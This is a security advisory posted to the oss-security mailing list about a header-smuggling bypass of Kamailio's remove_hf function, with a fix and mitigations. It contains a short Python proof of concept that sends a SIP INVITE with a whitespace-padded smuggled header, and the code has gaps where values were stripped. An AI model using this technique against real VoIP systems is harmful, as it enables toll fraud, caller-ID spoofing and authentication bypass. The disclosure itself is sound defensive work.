  oss-security - Kamailio vulnerable to header smuggling possible due to bypass of remove_hf            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 01 Sep From: "Sandro Gauci" <sandro@...blesecurity.com> To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com,  fulldisclosure@...lists.org, voipsec@...psa.org,  submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org Subject: Kamailio vulnerable to header smuggling possible due to bypass of remove_hf  # Kamailio vulnerable to header smuggling possible due to bypass of remove_hf  - Fixed versions: Kamailio - Enable Security Advisory: - Tested vulnerable versions: and earlier - Timeline:     - Report date & issue patched by Kamailio:      - Kamailio rewrite for header parser (better fix): to     - Kamailio release with fix:     - Enable Security advisory:  ## Description  Kamailio is often configured to remove certain special internal SIP headers from untrusted traffic to protect against header injection attacks by making use of the `remove_hf` function from the Kamailio `textops` module. These SIP headers were typically set through Kamailio which are then used downstream, e.g. by a media service based on Asterisk, to affect internal business logic decisions. During our tests and research, we noticed that the removal of these headers can be bypassed by injecting whitespace characters at the end of the header name.  Further discussion and details of this vulnerability can be found at the Communication Breakdown blog:  ## Impact  The impact of this security bypass greatly depends on how these headers are used and processed by the affected logic. In a worst case scenarios, this vulnerability could allow toll fraud, caller-ID spoofing and authentication bypass.  ## How to reproduce the issue  We prepared a docker-compose environment to demonstrate a vulnerable setup which can be found at The following python code could then be used to reproduce the issue:  ```python #!/usr/bin/env python3 sipmsg  = "INVITE sip:headerbypass@...alhost SIP/2.0\r\n" sipmsg += "Via: SIP/2.0/UDP sipmsg += "Max-Forwards: 70\r\n" sipmsg += "From: <sip:anon@...alhost>;tag=%s\r\n" sipmsg += "To: sip:whatever@...tever.local\r\n" sipmsg += "Call-ID: %s\r\n" sipmsg += "CSeq: 1 INVITE\r\n" sipmsg += "Contact: sipmsg += "X-Bypass-me : lol\r\n" sipmsg += "Content-Length: sipmsg += "Content-Type: application/sdp\r\n" sipmsg += "\r\n" sipmsg += "v=0\r\n" sipmsg += "o=- IN IP4 sipmsg += "s=-\r\n" sipmsg += "c=IN IP4 sipmsg += "t=0 0\r\n" sipmsg += "m=audio RTP/AVP 0 8 96 sipmsg += sipmsg += "a=rtpmap:0 sipmsg += "a=rtpmap:8 sipmsg += "a=rtpmap:96 sipmsg += "a=sendrecv\r\n"  target =  import socket import time from random import randint s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) r = data = sipmsg % (r,r,r) s.sendto(data.encode("utf-8"), target) while True:         print(data.decode("utf-8"))     time.sleep(5) ```  In the case of a vulnerable version of Kamailio, Asterisk would respond with a OK while in a fix version, you would get a Decline response.  ## Solutions and recommendations  The official Kamailio fix has been tested and found to sufficiently address this security flaw. We recommend making use of the latest release or backporting the fixes where possible. Making use of regular expressions to cover white-space characters with `remove_hf_re` has been suggested as mitigation for this issue for cases where the code cannot be upgraded.  Enable Security would like to thank Daniel-Constantin Mierla of the Kamailio Project for the very quick response and fix within minutes of our report being made available to him, as well as Torrey Searle for reporting this issue quickly to the Kamailio team.  ## About Enable Security  [Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.  ## Disclaimer  The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  ## Disclosure policy  This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      